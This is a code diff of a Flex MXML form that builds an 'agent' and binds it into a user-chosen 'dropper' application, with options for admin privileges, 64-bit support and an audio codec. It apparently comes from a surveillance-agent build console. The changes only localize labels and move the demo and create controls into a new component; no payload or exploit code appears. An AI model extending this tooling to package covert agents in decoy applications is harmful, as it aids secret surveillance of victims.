@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
          xmlns:s="library://ns.adobe.com/flex/spark" 
-         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%">
+         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
   <fx:Script>
     <![CDATA[
       import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
@@ -32,7 +32,7 @@
       }
       
       private var uploadPopup:UploadPopup;
-      private function create(event:MouseEvent):void
+      private function create():void
       {
         
         if (currentState != 'fileSelected') {
@@ -62,8 +62,8 @@
         PopUpManager.removePopUp(uploadPopup);
         
         var params:Object = {platform: parentDocument.platform, 
-                             binary: {demo: demo.selected, admin: admin.selected}, 
-                             melt: {admin: admin.selected, input: event.data, demo: demo.selected, codec: codec.selected, bit64: bit64.selected} };
+                             binary: {demo: createBtn.demo.selected, admin: admin.selected}, 
+                             melt: {admin: admin.selected, input: event.data, codec: codec.selected, bit64: bit64.selected} };
         
         params['factory'] = {_id: parentDocument.factory._id};
         
@@ -82,7 +82,13 @@
         AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
       }
 
-      
+      public function set platform(platform:*):void
+      {
+        if (platform == null)
+          return;
+        
+        createBtn.platforms = [platform];
+      }
       
     ]]>
   </fx:Script>
@@ -92,29 +98,23 @@
     <s:State name="fileSelected"/>
   </s:states>
     
-  <s:CheckBox id="admin" left="10" top="10" label="Require Administrative Priviledge"
+  <s:CheckBox id="admin" left="10" top="10" label="{R.get('REQUIRE_ADMIN')}"
               fontWeight="bold" selected="true"/>
   <s:TextArea left="25" top="25" width="280" height="55" borderVisible="false"
               contentBackgroundAlpha="0.0" editable="false"
-              text="When the agent is installed the system will request the higher possible privileges" />
+              text="{R.get('REQUIRE_ADMIN_DESC')}" />
   
 
   <s:HGroup left="10" top="70" height="25" verticalAlign="middle">
-    <s:Label text="Application to be used as dropper:" fontWeight="bold"/>
+    <s:Label text="{R.get('APPLICATION_DROPPER')}:" fontWeight="bold"/>
     <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}" click="browse()"/>
     <s:Label id="fileName" includeIn="fileSelected" buttonMode="true" click="browse()"
              maxDisplayedLines="1" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"/>    
   </s:HGroup>
   
-  <s:CheckBox left="10" top="110" id="bit64" label="Include 64bit support (50 Kb)" fontWeight="bold" selected="true" visible="{parentDocument.platform == 'windows'}"/>
-  <s:CheckBox left="10" top="130" id="codec" label="Include audio codec (200 Kb)" fontWeight="bold" selected="true" visible="{parentDocument.platform == 'windows'}"/>
+  <s:CheckBox left="10" top="110" id="bit64" label="{R.get('INCLUDE_64BIT')} (100 KiB)" fontWeight="bold" selected="true" visible="{parentDocument.platform == 'windows'}"/>
+  <s:CheckBox left="10" top="130" id="codec" label="{R.get('INCLUDE_AUDIO')} (200 KiB)" fontWeight="bold" selected="true" visible="{parentDocument.platform == 'windows'}"/>
 
-  
-  <s:HGroup left="10" bottom="0" right="10" horizontalAlign="right">
-    <s:CheckBox left="10" id="demo" label="Demo Mode" fontWeight="bold" 
-                enabled="{LicenseManager.instance.canBuild(parentDocument.platform)}"
-                selected="{!demo.enabled}"/>
-    <s:Button right="10" label="Create..." click="create(event)" />    
-  </s:HGroup>
+  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{create}"/>
   
 </s:Group>
